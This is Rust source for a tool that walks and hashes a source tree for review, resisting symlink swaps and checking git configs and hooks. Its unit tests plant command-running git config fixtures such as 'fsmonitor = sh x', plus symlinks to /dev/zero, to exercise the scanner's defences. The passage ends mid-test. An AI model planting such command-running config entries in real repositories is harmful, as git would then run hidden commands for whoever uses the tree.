//! Walking a source tree and hashing what is in it.
//!
//! The walk never follows symbolic links, including ones swapped in while it
//! runs. Each directory is opened, checked against the `lstat` taken before
//! opening it, and then read through its `/proc/self/fd/N` handle, so children
//! are looked up in the directory that was verified rather than by
//! re-resolving a path an attacker could change. Every opened file gets the
//! same device/inode check.

use std::collections::{HashMap, HashSet};
use std::ffi::OsString;
use std::fs::{self, File, Metadata, OpenOptions};
use std::io::{self, Read};
use std::os::fd::AsRawFd;
use std::os::unix::fs::{MetadataExt, OpenOptionsExt};
use std::path::{Path, PathBuf};

use crate::content::{self, Content, Format, Prefix};
use crate::error::Error;
use crate::files::{O_NONBLOCK, read_small_file};
use crate::git_state;
use crate::report::Gap;
use crate::sha256::{Digest, Sha256};

pub const MAX_TEXT_FILE_SIZE: u64 = 2 * 1024 * 1024;
pub const MAX_HASHED_FILE_SIZE: u64 = 512 * 1024 * 1024;

/// Whole-tree limits: past any of them the walk stops with a gap, so a tree
/// built to exhaust memory or time (thousands of hardlinks to one large
/// file, huge sparse files) fails closed quickly.
#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub struct Limits {
    pub files: usize,
    pub text_bytes: u64,
    pub hashed_bytes: u64,
}

impl Limits {
    pub const DEFAULT: Self = Self {
        files: 200_000,
        text_bytes: 256 * 1024 * 1024,
        hashed_bytes: 4 * 1024 * 1024 * 1024,
    };
}

/// Top-level directories a tool generates, skipped unless the scan is
/// thorough, and only when they carry the tool's marker file. The marker is
/// easy to fake, so a skip is always reported and a review with one is at
/// best WARNED. `vendor`, `dist` and `build` are shipped code and reviewed.
const GENERATED_DIRS: &[(&str, &[&str])] = &[
    ("target", &["CACHEDIR.TAG"]),
    (
        "node_modules",
        &[".package-lock.json", ".modules.yaml", ".yarn-state.yml"],
    ),
    (".venv", &["pyvenv.cfg"]),
];

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct ScanConfig {
    pub root: PathBuf,
    pub include_ignored_dirs: bool,
    /// Top-level directory names left out of both the review and the
    /// snapshot. A file or link of such a name is reviewed like any other:
    /// only a directory is something a build tool made.
    pub excluded_top_level: Vec<String>,
    /// Top-level names left out whatever they are. For comparing snapshots
    /// (what makepkg downloaded since), never for a review.
    pub excluded_entries: Vec<String>,
    pub limits: Limits,
}

impl ScanConfig {
    pub fn new(root: impl Into<PathBuf>) -> Self {
        Self {
            root: root.into(),
            include_ignored_dirs: false,
            excluded_top_level: Vec::new(),
            excluded_entries: Vec::new(),
            limits: Limits::DEFAULT,
        }
    }

    /// Names left out of the walk; `path` is the entry itself. `.git` is
    /// walked separately (see `Walker::git_directory`).
    fn skips(&self, name: &str, top_level: bool, path: &Path) -> bool {
        let named = |names: &[String]| names.iter().any(|excluded| excluded == name);
        name == ".git"
            || (top_level
                && (self.is_generated(name)
                    || named(&self.excluded_entries)
                    || (named(&self.excluded_top_level)
                        && fs::symlink_metadata(path).is_ok_and(|metadata| metadata.is_dir()))))
    }

    /// A top-level generated directory this scan skips.
    fn is_generated(&self, name: &str) -> bool {
        !self.include_ignored_dirs
            && GENERATED_DIRS.iter().any(|(generated, markers)| {
                *generated == name
                    && markers.iter().any(|marker| {
                        fs::symlink_metadata(self.root.join(name).join(marker))
                            .is_ok_and(|metadata| metadata.is_file())
                    })
            })
    }
}

/// A generated directory the walk skipped, with how many entries it held
/// (counted without reading them, up to the file limit).
#[derive(Clone, Debug, PartialEq, Eq)]
pub struct SkippedDir {
    pub path: String,
    pub files: usize,
}

#[derive(Clone, Copy, Debug, PartialEq, Eq)]
pub enum FileKind {
    /// Text within the review size limit (see `FileHash::lossy`).
    Text,
    /// A script, build or config file holding binary data: a gap.
    Undecodable,
    /// Hashed but not reviewed.
    Binary,
    /// Text too large to review; makes the scan incomplete.
    OversizedText,
    /// A relative symbolic link to a file or directory the review covers.
    /// Its digest is over the link text, so retargeting it changes the
    /// snapshot.
    Symlink,
}

#[derive(Clone, Debug, PartialEq, Eq)]
pub struct FileHash {
    /// Path relative to the scan root, `/`-separated.
    pub path: String,
    pub sha256: Digest,
    pub kind: FileKind,
    /// The format of a hash-only file.
    pub format: Option<Format>,
    /// Text decoded with replacement characters.
    pub lossy: bool,
    /// Size in bytes.
    pub bytes: u64,
    /// The execute bit.
    pub executable: bool,
}

/// The files of a tree, sorted by path.
#[derive(Clone, Debug, Default, PartialEq, Eq)]
pub struct Snapshot {
    files: Vec<FileHash>,
    skipped: Vec<SkippedDir>,
}

impl Snapshot {
    fn from_files(mut files: Vec<FileHash>, skipped: Vec<SkippedDir>) -> Self {
        files.sort_by(|left, right| left.path.cmp(&right.path));
        Self { files, skipped }
    }

    pub fn files(&self) -> &[FileHash] {
        &self.files
    }

    /// Generated directories left out of the review.
    pub fn skipped(&self) -> &[SkippedDir] {
        &self.skipped
    }

    pub fn count(&self, kind: FileKind) -> usize {
        self.files.iter().filter(|file| file.kind == kind).count()
    }

    /// One digest over the whole manifest: path, NUL, hex digest, a kind
    /// byte (1 reviewed text, 2 symbolic link, 0 otherwise) and the execute
    /// bit per file: a file made executable is not the same tree.
    pub fn manifest_digest(&self) -> Digest {
        let mut hasher = Sha256::new();
        for file in &self.files {
            hasher.update(file.path.as_bytes());
            hasher.update(&[0]);
            hasher.update(file.sha256.to_string().as_bytes());
            hasher.update(&[match file.kind {
                FileKind::Text => 1,
                FileKind::Symlink => 2,
                FileKind::Binary | FileKind::OversizedText | FileKind::Undecodable => 0,
            }]);
            hasher.update(&[u8::from(file.executable)]);
            hasher.update(b"\n");
        }
        for skipped in &self.skipped {
            hasher.update(b"skipped\0");
            hasher.update(skipped.path.as_bytes());
            hasher.update(format!("\0{}\n", skipped.files).as_bytes());
        }
        hasher.finalize()
    }
}

/// A reviewable text file found by the walk.
pub struct TextFile<'a> {
    pub rel: &'a str,
    pub text: &'a str,
    /// Decoded with replacement characters from a legacy encoding.
    pub lossy: bool,
    /// A git configuration in a directory laid out as a repository under
    /// another name: checked like `.git/config` as well, and reviewed with
    /// the credentials in its addresses taken out.
    pub git_config: bool,
}

/// Walks the tree, calling `on_text` for each reviewable text file. Returns
/// the snapshot of every file found and the reasons the walk was incomplete.
pub fn walk(config: &ScanConfig, on_text: &mut dyn FnMut(TextFile<'_>)) -> (Snapshot, Vec<Gap>) {
    let mut walker = Walker {
        config,
        on_text,
        files: Vec::new(),
        gaps: Vec::new(),
        text_bytes: 0,
        hashed_bytes: 0,
        stopped: false,
        links: HashMap::new(),
        skipped: Vec::new(),
        git_configs: HashSet::new(),
    };

    let root = &config.root;
    let rel = if fs::symlink_metadata(root).is_ok_and(|metadata| metadata.is_dir()) {
        String::new()
    } else {
        root.file_name().map_or_else(
            || root.display().to_string(),
            |name| name.to_string_lossy().into_owned(),
        )
    };
    walker.entry(root, root, rel);

    (
        Snapshot::from_files(walker.files, walker.skipped),
        walker.gaps,
    )
}

/// Re-walks the tree and requires it to match `expected` exactly.
pub fn verify_unchanged(config: &ScanConfig, expected: &Snapshot) -> Result<(), Error> {
    let (current, gaps) = walk(config, &mut |_| {});
    if !gaps.is_empty() {
        return Err(Error::Refused(
            "the source tree changed or became unreadable after review".into(),
        ));
    }
    if current != *expected {
        return Err(Error::Refused(
            "the scanned file set or file contents changed after review".into(),
        ));
    }
    Ok(())
}

/// Like `verify_unchanged`, for a copy made without git's own directories
/// (the sandbox leaves them behind): those are not compared.
pub fn verify_copy(config: &ScanConfig, expected: &Snapshot) -> Result<(), Error> {
    let (current, gaps) = walk(config, &mut |_| {});
    let kept = |snapshot: &Snapshot| -> Vec<FileHash> {
        snapshot
            .files
            .iter()
            .filter(|file| file.path.split('/').all(|part| part != ".git"))
            .cloned()
            .collect()
    };
    if !gaps.is_empty() || kept(&current) != kept(expected) || current.skipped != expected.skipped {
        return Err(Error::Refused(
            "the sandbox copy does not match the reviewed source".into(),
        ));
    }
    Ok(())
}

struct Walker<'a> {
    config: &'a ScanConfig,
    on_text: &'a mut dyn FnMut(TextFile<'_>),
    files: Vec<FileHash>,
    gaps: Vec<Gap>,
    text_bytes: u64,
    hashed_bytes: u64,
    /// A limit was passed: the walk stops and the review is incomplete.
    stopped: bool,
    /// Files with more than one link, by device and inode: read once.
    links: HashMap<LinkKey, (Digest, Contents)>,
    skipped: Vec<SkippedDir>,
    /// The git configurations of directories laid out as repositories.
    git_configs: HashSet<String>,
}

impl Walker<'_> {
    fn io_gap(&mut self, logical: &Path, source: io::Error) {
        self.gaps.push(Gap::Io(Error::Io {
            path: logical.to_path_buf(),
            source,
        }));
    }

    /// Visits one entry. `access` is the path used to reach it (under a
    /// verified directory handle); `logical` is the path shown to the user.
    fn entry(&mut self, access: &Path, logical: &Path, rel: String) {
        if self.stopped {
            return;
        }
        if self.files.len() >= self.config.limits.files {
            return self.stop();
        }
        let metadata = match fs::symlink_metadata(access) {
            Ok(metadata) => metadata,
            Err(error) => return self.io_gap(logical, error),
        };
        let file_type = metadata.file_type();
        let shown = logical.display().to_string();

        if file_type.is_symlink() {
            self.symlink(access, logical, rel);
        } else if file_type.is_dir() {
            match open_verified(access, &metadata) {
                Ok(directory) => self.directory(&directory, logical, &rel),
                Err(error) => self.io_gap(logical, error),
            }
        } else if file_type.is_file() {
            match open_verified(access, &metadata) {
                Ok(file) => self.file(file, &metadata, logical, rel),
                Err(error) => self.io_gap(logical, error),
            }
        } else {
            self.gaps.push(Gap::SpecialFile(shown));
        }
    }

    /// Records a link that stays inside the reviewed tree; anything else is
    /// a gap. Links are never followed: the file or directory they name is
    /// reviewed where it is.
    fn symlink(&mut self, access: &Path, logical: &Path, rel: String) {
        if logical == self.config.root {
            return self.gaps.push(Gap::Symlink(logical.display().to_string()));
        }
        let target = match fs::read_link(access) {
            Ok(target) => target,
            Err(error) => return self.io_gap(logical, error),
        };
        match target.to_str() {
            Some(target) if self.is_in_tree_target(&rel, target) => {
                let mut hasher = Sha256::new();
                hasher.update(b"symlink\0");
                hasher.update(target.as_bytes());
                self.files.push(FileHash {
                    path: rel,
                    sha256: hasher.finalize(),
                    kind: FileKind::Symlink,
                    format: None,
                    lossy: false,
                    bytes: 0,
                    executable: false,
                });
            }
            Some(_) | None => self.gaps.push(Gap::Symlink(logical.display().to_string())),
        }
    }

    /// Whether the link at `rel` names, relative to its own directory, an
    /// existing regular file or directory that the walk reviews. `..` may
    /// only lead the target and never climb above the root. The link's own
    /// ancestors are real directories (the walk never follows links), and
    /// every component after them must be too, so the lexical resolution
    /// is the real one.
    fn is_in_tree_target(&self, rel: &str, target: &str) -> bool {
        if target.is_empty() || target.starts_with('/') {
            return false;
        }
        let mut resolved: Vec<&str> = rel.split('/').collect();
        resolved.pop();
        let mut leading = true;
        for component in target.split('/') {
            match component {
                "" | "." => {}
                ".." if leading => {
                    if resolved.pop().is_none() {
                        return false;
                    }
                }
                ".." => return false,
                name => {
                    leading = false;
                    resolved.push(name);
                }
            }
        }
        if resolved.is_empty() {
            return false;
        }

        let mut path = self.config.root.clone();
        for (index, name) in resolved.iter().enumerate() {
            if self.config.skips(name, index == 0, &path.join(name)) {
                return false;
            }
            path.push(name);
            let Ok(metadata) = fs::symlink_metadata(&path) else {
                return false;
            };
            let last = index + 1 == resolved.len();
            if !(metadata.is_dir() || (last && metadata.is_file())) {
                return false;
            }
        }
        true
    }

    fn directory(&mut self, directory: &File, logical: &Path, rel: &str) {
        let handle = fd_path(directory);
        let listing = match fs::read_dir(&handle) {
            Ok(listing) => listing,
            Err(error) => return self.io_gap(logical, error),
        };

        let mut names: Vec<OsString> = Vec::new();
        for entry in listing {
            match entry {
                Ok(entry) => names.push(entry.file_name()),
                Err(error) => self.io_gap(logical, error),
            }
        }
        names.sort();

        // A directory laid out as a git repository without being called
        // `.git` (a bare repository, or where a `commondir` points): git
        // run in it takes its configuration from here all the same. That
        // configuration is checked as `.git/config` is, and reviewed like
        // any file with the credentials in its addresses taken out.
        let has = |name: &str| names.iter().any(|entry| entry == name);
        if has("HEAD") && has("objects") && has("refs") {
            for config in ["config", "config.worktree"] {
                if !has(config) {
                    continue;
                }
                let config_rel = if rel.is_empty() {
                    config.to_string()
                } else {
                    format!("{rel}/{config}")
                };
                if read_small_file(&handle.join(config), MAX_TEXT_FILE_SIZE).is_none() {
                    self.gaps.push(Gap::GitState(format!(
                        "{config_rel}: the configuration of a directory laid out as a git repository cannot be read"
                    )));
                }
                self.git_configs.insert(config_rel);
            }
        }

        for name in names {
            let child_logical = logical.join(&name);
            let Some(name_text) = name.to_str() else {
                self.gaps
                    .push(Gap::NonUtf8Name(child_logical.display().to_string()));
                continue;
            };
            let child_rel = if rel.is_empty() {
                name_text.to_string()
            } else {
                format!("{rel}/{name_text}")
            };
            if name_text == ".git" {
                self.git_directory(&handle.join(&name), &child_logical, &child_rel);
                continue;
            }
            if rel.is_empty() && self.config.is_generated(name_text) {
                let files = count_entries(&handle.join(&name), self.config.limits.files);
                self.skipped.push(SkippedDir {
                    path: child_rel,
                    files,
                });
                continue;
            }
            if self
                .config
                .skips(name_text, rel.is_empty(), &handle.join(&name))
            {
                continue;
            }
            self.entry(&handle.join(&name), &child_logical, child_rel);
        }
    }

    /// A submodule's git directory under `modules`, or, for a submodule
    /// at a nested path (`vendor/lib`), the directories on the way to it.
    fn git_module(&mut self, access: &Path, logical: &Path, rel: &str, depth: usize) {
        if depth >= MAX_MODULE_DEPTH {
            self.gaps.push(Gap::GitState(format!(
                "{rel}: submodule directories nested too deep to review"
            )));
            return;
        }
        let is_directory = fs::symlink_metadata(access).is_ok_and(|metadata| metadata.is_dir());
        // A submodule named `a/b` lives below the one named `a`, so a git
        // directory is looked into as well.
        let is_git = fs::symlink_metadata(access.join("HEAD")).is_ok()
            || fs::symlink_metadata(access.join("config")).is_ok();
        if is_git || !is_directory {
            self.git_directory(access, logical, rel);
        }
        if !is_directory {
            return;
        }
        let listing = match fs::read_dir(access) {
            Ok(listing) => listing,
            Err(error) => return self.io_gap(logical, error),
        };
        let mut names: Vec<String> = listing
            .filter_map(Result::ok)
            .filter_map(|entry| entry.file_name().into_string().ok())
            .collect();
        names.sort();
        for name in names {
            let child = access.join(&name);
            if is_git && git_state::OWN_DIRECTORIES.contains(&name.as_str()) {
                continue;
            }
            let Ok(metadata) = fs::symlink_metadata(&child) else {
                continue;
            };
            // Git follows a link to a submodule's directory; the walk
            // does not.
            if metadata.file_type().is_symlink() {
                if fs::metadata(&child).is_ok_and(|target| target.is_dir()) {
                    self.gaps
                        .push(Gap::Symlink(format!("{rel}/{name} (a linked submodule)")));
                }
                continue;
            }
            // A file here is git's own state, not a submodule.
            if !metadata.is_dir() {
                continue;
            }
            self.git_module(
                &child,
                &logical.join(&name),
                &format!("{rel}/{name}"),
                depth + 1,
            );
        }
    }

    /// A `.git` directory: its `config` (checked for keys that run commands,
    /// never sent to the AI) and its hooks other than git's `.sample` files
    /// are reviewed, and a submodule's git directory the same way. The
    /// objects and index are not read. A `.git` file or link (a worktree
    /// or submodule pointer), a linked `config` and linked hooks or
    /// submodules are gaps: git reads them and the walk cannot.
    fn git_directory(&mut self, access: &Path, logical: &Path, rel: &str) {
        let Ok(metadata) = fs::symlink_metadata(access) else {
            return;
        };
        if !metadata.is_dir() {
            // A `.git` that is a file or a link points git at a directory
            // of its own choosing, whose configuration and hooks are then
            // not the ones read here.
            self.gaps.push(Gap::Symlink(format!(
                "{rel} (a git directory given as a file or a link)"
            )));
            return;
        }
        let directory = match open_verified(access, &metadata) {
            Ok(directory) => directory,
            Err(error) => return self.io_gap(logical, error),
        };
        let handle = fd_path(&directory);
        // With a `commondir`, git takes the configuration and hooks of
        // the directory it names instead of this one's.
        if fs::symlink_metadata(handle.join("commondir")).is_ok() {
            self.gaps.push(Gap::GitState(format!(
                "{rel}/commondir: git reads this repository's configuration and hooks from another directory"
            )));
        }
        for config in ["config", "config.worktree"] {
            match fs::symlink_metadata(handle.join(config)) {
                // Git reads through a link here; the walk would only
                // record where it points.
                Ok(metadata) if metadata.file_type().is_symlink() => {
                    self.gaps.push(Gap::Symlink(format!("{rel}/{config}")));
                }
                Ok(_) => self.entry(
                    &handle.join(config),
                    &logical.join(config),
                    format!("{rel}/{config}"),
                ),
                Err(_) => {}
            }
        }
        for (name, hooks) in [("hooks", true), ("modules", false)] {
            let Ok(metadata) = fs::symlink_metadata(handle.join(name)) else {
                continue;
            };
            if !metadata.is_dir() {
                // Hooks or submodules behind a link are read by git and
                // not by the walk.
                if metadata.file_type().is_symlink() {
                    self.gaps.push(Gap::Symlink(format!("{rel}/{name}")));
                }
                continue;
            }
            let child = match open_verified(&handle.join(name), &metadata) {
                Ok(child) => child,
                Err(error) => {
                    self.io_gap(&logical.join(name), error);
                    continue;
                }
            };
            let child_handle = fd_path(&child);
            let mut names: Vec<String> = match fs::read_dir(&child_handle) {
                Ok(listing) => listing
                    .filter_map(Result::ok)
                    .filter_map(|entry| entry.file_name().into_string().ok())
                    .collect(),
                Err(error) => {
                    self.io_gap(&logical.join(name), error);
                    continue;
                }
            };
            names.sort();
            for entry in names {
                let entry_rel = format!("{rel}/{name}/{entry}");
                let entry_logical = logical.join(name).join(&entry);
                if hooks {
                    if !entry.ends_with(".sample") {
                        self.entry(&child_handle.join(&entry), &entry_logical, entry_rel);
                    }
                } else {
                    self.git_module(&child_handle.join(&entry), &entry_logical, &entry_rel, 0);
                }
            }
        }
    }

    fn stop(&mut self) {
        if !self.stopped {
            self.stopped = true;
            self.gaps.push(Gap::TreeTooLarge {
                files: self.files.len(),
                bytes: self.hashed_bytes,
            });
        }
    }

    fn file(&mut self, mut file: File, metadata: &Metadata, logical: &Path, rel: String) {
        if metadata.len() > MAX_HASHED_FILE_SIZE {
            self.gaps
                .push(Gap::HashLimit(logical.display().to_string()));
            return;
        }
        // Counted before reading, so a huge sparse file is refused unread.
        self.hashed_bytes += metadata.len();
        if self.hashed_bytes > self.config.limits.hashed_bytes {
            return self.stop();
        }

        let executable = metadata.mode() & 0o111 != 0;
        // How a file is read depends on its name and mode as well as on
        // its bytes: a link under a script's name is not classed by what
        // the same bytes were under a data file's.
        let extension = rel
            .rsplit('/')
            .next()
            .and_then(|name| name.rsplit_once('.'))
            .map(|(_, extension)| extension.to_ascii_lowercase())
            .unwrap_or_default();
        let key = (
            metadata.dev(),
            metadata.ino(),
            extension,
            content::must_review(&rel, b""),
        );
        let cached = (metadata.nlink() > 1)
            .then(|| self.links.get(&key).cloned())
            .flatten();
        let (sha256, contents) = match cached {
            Some(result) => result,
            None => match read_classified(&mut file, &rel, executable) {
                Ok(result) => {
                    if metadata.nlink() > 1 {
                        self.links.insert(key, result.clone());
                    }
                    result
                }
                Err(error) => return self.io_gap(logical, error),
            },
        };
        let (kind, format, lossy) = match &contents {
            Contents::Text(text, lossy) => {
                self.text_bytes += text.len() as u64;
                if self.text_bytes > self.config.limits.text_bytes {
                    return self.stop();
                }
                (self.on_text)(TextFile {
                    rel: &rel,
                    text,
                    lossy: *lossy,
                    git_config: self.git_configs.contains(&rel),
                });
                (FileKind::Text, None, *lossy)
            }
            Contents::Binary(format) => (FileKind::Binary, Some(*format), false),
            Contents::OversizedText => {
                self.gaps.push(Gap::OversizedText(rel.clone()));
                (FileKind::OversizedText, None, false)
            }
            Contents::Undecodable => {
                self.gaps.push(Gap::Undecodable(rel.clone()));
                (FileKind::Undecodable, None, false)
            }
        };
        self.files.push(FileHash {
            path: rel,
            sha256,
            kind,
            format,
            lossy,
            bytes: metadata.len(),
            executable,
        });
    }
}

/// How deep under `modules` a submodule's git directory is looked for.
const MAX_MODULE_DEPTH: usize = 6;

/// A file with several links, and how its name makes it be read (its
/// extension, and whether it is one that must be reviewed).
type LinkKey = (u64, u64, String, bool);

/// Entries under `path`, not following links, counted up to `limit`.
fn count_entries(path: &Path, limit: usize) -> usize {
    let mut count = 0;
    let mut pending = vec![path.to_path_buf()];
    while let Some(directory) = pending.pop() {
        let Ok(listing) = fs::read_dir(&directory) else {
            continue;
        };
        for entry in listing.filter_map(Result::ok) {
            count += 1;
            if count >= limit {
                return count;
            }
            if entry.file_type().is_ok_and(|kind| kind.is_dir()) {
                pending.push(entry.path());
            }
        }
    }
    count
}

fn fd_path(file: &File) -> PathBuf {
    PathBuf::from(format!("/proc/self/fd/{}", file.as_raw_fd()))
}

/// Opens `access` and checks it is still the object `expected` describes.
fn open_verified(access: &Path, expected: &Metadata) -> io::Result<File> {
    let file = OpenOptions::new()
        .read(true)
        .custom_flags(O_NONBLOCK)
        .open(access)?;
    let opened = file.metadata()?;
    if opened.dev() != expected.dev() || opened.ino() != expected.ino() {
        return Err(io::Error::other("changed while it was being scanned"));
    }
    Ok(file)
}

#[derive(Clone)]
enum Contents {
    /// Text to review; `true` when decoded with replacement characters.
    Text(String, bool),
    Binary(Format),
    OversizedText,
    Undecodable,
}

/// Hashes the whole file and classifies it (see `content::classify`),
/// keeping its text when it is small enough to review. Larger files are
/// classified from their first bytes and streamed.
fn read_classified(file: &mut File, rel: &str, executable: bool) -> io::Result<(Digest, Contents)> {
    let mut hasher = Sha256::new();
    let mut head = Vec::new();
    file.by_ref()
        .take(MAX_TEXT_FILE_SIZE + 1)
        .read_to_end(&mut head)?;
    hasher.update(&head);

    if head.len() as u64 <= MAX_TEXT_FILE_SIZE {
        let digest = hasher.finalize();
        let contents = match content::classify(rel, executable, false, &head) {
            Content::Text(text) => Contents::Text(text, false),
            Content::Lossy { text, .. } => Contents::Text(text, true),
            Content::Binary(format) => Contents::Binary(format),
            Content::Undecodable => Contents::Undecodable,
        };
        return Ok((digest, contents));
    }

    let contents = match content::classify_prefix(rel, executable, &head) {
        Prefix::Text => Contents::OversizedText,
        Prefix::Binary(format) => Contents::Binary(format),
        Prefix::Undecodable => Contents::Undecodable,
    };

    let mut total = head.len() as u64;
    let mut buffer = vec![0_u8; 64 * 1024];
    loop {
        let count = file.read(&mut buffer)?;
        if count == 0 {
            break;
        }
        total += count as u64;
        if total > MAX_HASHED_FILE_SIZE {
            return Err(io::Error::other("file grew past the integrity-hash limit"));
        }
        hasher.update(&buffer[..count]);
    }
    Ok((hasher.finalize(), contents))
}

#[cfg(test)]
mod tests {
    use std::ffi::OsStr;
    use std::fs;
    use std::os::unix::ffi::OsStrExt;
    use std::os::unix::fs::PermissionsExt;
    use std::os::unix::fs::symlink;

    use super::{FileKind, MAX_TEXT_FILE_SIZE, ScanConfig, verify_unchanged, walk};
    use crate::report::Gap;
    use crate::test_support::TempDir;

    fn walk_texts(config: &ScanConfig) -> (Vec<String>, super::Snapshot, Vec<Gap>) {
        let mut texts = Vec::new();
        let (snapshot, gaps) = walk(config, &mut |file| texts.push(file.rel.to_string()));
        (texts, snapshot, gaps)
    }

    #[test]
    fn a_repository_under_another_name_is_read_without_waiting_on_it() {
        let dir = TempDir::new("bare-layout");
        let bare = dir.path().join("b");
        fs::create_dir_all(bare.join("objects")).unwrap();
        fs::create_dir_all(bare.join("refs")).unwrap();
        fs::write(bare.join("HEAD"), "ref: refs/heads/main\n").unwrap();
        // A configuration that is no regular file: a gap, not a read.
        symlink("/dev/zero", bare.join("config")).unwrap();
        let config = ScanConfig::new(dir.path().to_path_buf());
        let (_, _, gaps) = walk_texts(&config);
        assert!(
            gaps.iter().any(|gap| matches!(gap, Gap::GitState(_))),
            "{gaps:?}"
        );

        // A submodule kept below another one's git directory.
        let dir = TempDir::new("nested-modules");
        let modules = dir.path().join(".git/modules");
        fs::create_dir_all(modules.join("a/b/hooks")).unwrap();
        fs::write(modules.join("a/HEAD"), "ref: x\n").unwrap();
        fs::write(modules.join("a/b/config"), "[core]\n").unwrap();
        fs::write(modules.join("a/b/hooks/post-checkout"), "#!/bin/sh\n").unwrap();
        // What git leaves behind in one is no submodule.
        fs::create_dir_all(modules.join("a/rebase-merge")).unwrap();
        fs::write(modules.join("a/rebase-merge/head-name"), "refs/heads/x\n").unwrap();
        let config = ScanConfig::new(dir.path().to_path_buf());
        let (texts, _, gaps) = walk_texts(&config);
        assert!(gaps.is_empty(), "{gaps:?}");
        for expected in [
            ".git/modules/a/b/config",
            ".git/modules/a/b/hooks/post-checkout",
        ] {
            assert!(texts.contains(&expected.to_string()), "{texts:?}");
        }
        // One reached through a link is not read, and says so.
        symlink(dir.path(), modules.join("a/linked")).unwrap();
        let (_, _, gaps) = walk_texts(&config);
        assert!(matches!(gaps.as_slice(), [Gap::Symlink(_)]), "{gaps:?}");
    }

    #[test]
    fn hashes_files_and_detects_post_review_changes() {
        let dir = TempDir::new("snapshot");
        let source = dir.path().join("main.rs");
        fs::write(&source, "fn main() {}\n").unwrap();
        let config = ScanConfig::new(dir.path());

        let (texts, snapshot, gaps) = walk_texts(&config);
        assert_eq!(texts, ["main.rs"]);
        assert!(gaps.is_empty());
        assert_eq!(snapshot.files().len(), 1);
        assert!(verify_unchanged(&config, &snapshot).is_ok());

        fs::write(&source, "fn main() { println!(\"changed\"); }\n").unwrap();
        assert!(verify_unchanged(&config, &snapshot).is_err());
    }

    #[test]
    fn shipped_directories_are_reviewed_and_marked_generated_ones_skipped() {
        let dir = TempDir::new("ignored");
        for directory in [
            "vendor",
            "dist",
            "build",
            "src/node_modules/x",
            "node_modules/x",
            "target",
        ] {
            fs::create_dir_all(dir.path().join(directory)).unwrap();
        }
        fs::write(dir.path().join("vendor/lib.sh"), "x\n").unwrap();
        fs::write(dir.path().join("dist/app.js"), "x\n").unwrap();
        fs::write(dir.path().join("build/install.sh"), "x\n").unwrap();
        fs::write(dir.path().join("src/node_modules/x/i.js"), "x\n").unwrap();
        fs::write(dir.path().join("node_modules/x/i.js"), "x\n").unwrap();
        fs::write(dir.path().join("node_modules/.package-lock.json"), "{}\n").unwrap();
        // No CACHEDIR.TAG: not generated-shaped, so reviewed.
        fs::write(dir.path().join("target/run.sh"), "x\n").unwrap();

        let mut config = ScanConfig::new(dir.path());
        let (texts, snapshot, _) = walk_texts(&config);
        assert_eq!(
            texts,
            [
                "build/install.sh",
                "dist/app.js",
                "src/node_modules/x/i.js",
                "target/run.sh",
                "vendor/lib.sh"
            ]
        );
        assert_eq!(
            snapshot.skipped(),
            [super::SkippedDir {
                path: "node_modules".into(),
                files: 3
            }]
        );

        // A new file in a skipped directory changes the snapshot.
        fs::write(dir.path().join("node_modules/x/j.js"), "x\n").unwrap();
        assert!(verify_unchanged(&config, &snapshot).is_err());

        config.include_ignored_dirs = true;
        assert!(
            walk_texts(&config)
                .0
                .contains(&"node_modules/x/i.js".to_string())
        );
    }

    #[test]
    fn git_config_and_real_hooks_are_reviewed_and_samples_are_not() {
        let dir = TempDir::new("git-state");
        fs::create_dir_all(dir.path().join(".git/hooks")).unwrap();
        fs::create_dir_all(dir.path().join(".git/objects/aa")).unwrap();
        fs::create_dir_all(dir.path().join(".git/modules/lib/hooks")).unwrap();
        fs::write(dir.path().join(".git/config"), "[core]\n").unwrap();
        fs::write(dir.path().join(".git/HEAD"), "ref: x\n").unwrap();
        fs::write(dir.path().join(".git/objects/aa/b"), "x\n").unwrap();
        fs::write(dir.path().join(".git/hooks/pre-commit.sample"), "x\n").unwrap();
        fs::write(dir.path().join(".git/hooks/post-checkout"), "x\n").unwrap();
        fs::write(dir.path().join(".git/modules/lib/config"), "[core]\n").unwrap();
        fs::write(dir.path().join(".git/modules/lib/hooks/pre-push"), "x\n").unwrap();

        let config = ScanConfig::new(dir.path());
        let (texts, snapshot, gaps) = walk_texts(&config);
        assert!(gaps.is_empty(), "{gaps:?}");
        assert_eq!(
            texts,
            [
                ".git/config",
                ".git/hooks/post-checkout",
                ".git/modules/lib/config",
                ".git/modules/lib/hooks/pre-push"
            ]
        );
        fs::write(dir.path().join(".git/config"), "[core]\n\tfsmonitor = x\n").unwrap();
        assert!(verify_unchanged(&config, &snapshot).is_err());

        // What git would read and the walk cannot is said, not passed over:
        // hooks behind a link, a linked config, a git directory given as a
        // file.
        fs::remove_dir_all(dir.path().join(".git/hooks")).unwrap();
        symlink("../elsewhere", dir.path().join(".git/hooks")).unwrap();
        fs::write(dir.path().join(".git/config.worktree"), "[core]\n").unwrap();
        let (texts, _, gaps) = walk_texts(&config);
        assert!(
            texts.contains(&".git/config.worktree".to_string()),
            "{texts:?}"
        );
        assert_eq!(gaps.len(), 1, "{gaps:?}");
        fs::create_dir_all(dir.path().join("sub")).unwrap();
        fs::write(dir.path().join("sub/.git"), "gitdir: ../.git/modules/lib\n").unwrap();
        let (_, _, gaps) = walk_texts(&config);
        assert_eq!(gaps.len(), 2, "{gaps:?}");

        // A commondir, a submodule at a nested path, and a repository
        // laid out under another name.
        fs::write(dir.path().join(".git/commondir"), "../elsewhere\n").unwrap();
        fs::create_dir_all(dir.path().join(".git/modules/vendor/lib/hooks")).unwrap();
        fs::write(
            dir.path().join(".git/modules/vendor/lib/config"),
            "[core]\n",
        )
        .unwrap();
        fs::create_dir_all(dir.path().join("bare/objects")).unwrap();
        fs::create_dir_all(dir.path().join("bare/refs")).unwrap();
        fs::write(dir.path().join("bare/HEAD"), "ref: refs/heads/main\n").unwrap();
        fs::write(
            dir.path().join("bare/config"),
            "[core]\n\tfsmonitor = sh x\n",
        )
        .unwrap();
        let (texts, _, gaps) = walk_texts(&config);
        assert!(
            texts.contains(&".git/modules/vendor/lib/config".to_string()),
            "{texts:?}"
        );
        let states: Vec<&Gap> = gaps
            .iter()
            .filter(|gap| matches!(gap, Gap::GitState(_)))
            .collect();
        assert_eq!(states.len(), 1, "{gaps:?}");
        // The repository under another name has its configuration handed
        // on as one, to be checked like `.git/config` and not sent on.
        let mut configs = Vec::new();
        walk(&config, &mut |file| {
            if file.git_config {
                configs.push(file.rel.to_string());
            }
        });
        assert_eq!(configs, ["bare/config"]);
        // One that cannot be read says so.
        fs::remove_file(dir.path().join("bare/config")).unwrap();
        symlink("/dev/zero", dir.path().join("bare/config")).unwrap();
